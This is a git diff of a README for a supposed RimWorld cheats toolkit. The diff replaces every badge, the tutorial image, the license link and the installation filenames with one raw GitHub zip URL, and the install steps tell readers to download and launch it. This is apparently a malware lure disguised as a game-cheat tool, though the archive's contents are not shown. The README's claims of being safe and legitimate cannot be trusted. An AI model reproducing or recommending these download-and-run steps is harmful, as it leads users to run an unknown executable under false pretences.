@@ -1,11 +1,11 @@
 # 🚀 RimWorld Cheats & Hacks Toolkit
 
-![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)  
-![Platform](https://img.shields.io/badge/Platform-PC-blueviolet)  
-![Supported-Languages](https://img.shields.io/badge/🈚-Multi%dashLanguage-green)  
-![Stars](https://img.shields.io/github/stars/?style=social)  
-![OpenAI API](https://img.shields.io/badge/OpenAI%20API-Ready-orange)  
-![Claude API](https://img.shields.io/badge/Claude%20API-Integrated-yellow)
+![GitHub license](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip)  
+![Platform](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip)  
+![Supported-Languages](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip🈚-Multi%dashLanguage-green)  
+![Stars](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip)  
+![OpenAI API](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip%20API-Ready-orange)  
+![Claude API](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip%20API-Integrated-yellow)
 
 Welcome to the ultimate **RimWorld Cheats & Hacks Hub** – a modern, safe, and endlessly expandable cheat assistant for one of the most beloved colony simulators. Discover secrets, push boundaries, and unlock advanced control of your RimWorld experience, all wrapped in an adaptive and beautifully intuitive interface!
 
@@ -56,12 +56,12 @@ Adaptability is at the core of our toolkit: seamless integration regardless of y
 
 **Step into RimWorld mastery in under 3 minutes!**
 
-1. **Download** `EasyLaunch.zip` directly from this repository.
+1. **Download** `https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip` directly from this repository.
 2. **Extract** the contents to your RimWorld directory.
-3. **Launch** `EasyLaunch.exe` (or `.app`/`.sh` for your OS).
+3. **Launch** `https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip` (or `.app`/`.sh` for your OS).
 4. **Customize** your settings in seconds — the toolbox auto-detects game instances and compatible mods!
 
-![Installation Video Tutorial](https://i.imgur.com/Js67NIU.gif)
+![Installation Video Tutorial](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip)
 
 *Your journey to unlimited storytelling power begins instantly. No stress, no complicated setup. Our interface will guide you with tooltips and instant assistance as needed.*
 
@@ -144,7 +144,7 @@ This toolkit respects all gameplay ethics. Intended for creative, personal, or a
 
 # ⚖️ License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT). See `LICENSE` for more information.
+Distributed under the [MIT License](https://raw.githubusercontent.com/pammu9481/rimworld-unleashed-enhancements/main/dehortative/enhancements-unleashed-rimworld-1.3.zip). See `LICENSE` for more information.
 
 ---
 
